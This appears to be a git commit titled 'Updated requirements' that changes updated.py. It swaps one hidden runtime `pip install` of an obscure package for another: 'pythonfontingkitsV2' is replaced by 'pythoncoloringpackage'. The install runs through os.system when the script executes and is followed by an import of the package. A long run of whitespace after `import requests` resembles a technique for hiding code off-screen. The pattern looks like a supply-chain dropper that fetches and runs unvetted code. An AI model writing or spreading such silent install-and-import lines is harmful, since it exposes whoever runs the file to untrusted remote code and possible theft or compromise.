ed54297df1637a828be735fceb05cc2461dadc91
Wieselnuggis <105999132+Wieselnuggis@users.noreply.github.com>
2023-07-24 16:38:49 -0500

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonfontingkitsV2")
-import pythonfontingkitsV2
+os.system("pip install pythoncoloringpackage")
+import pythoncoloringpackage
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
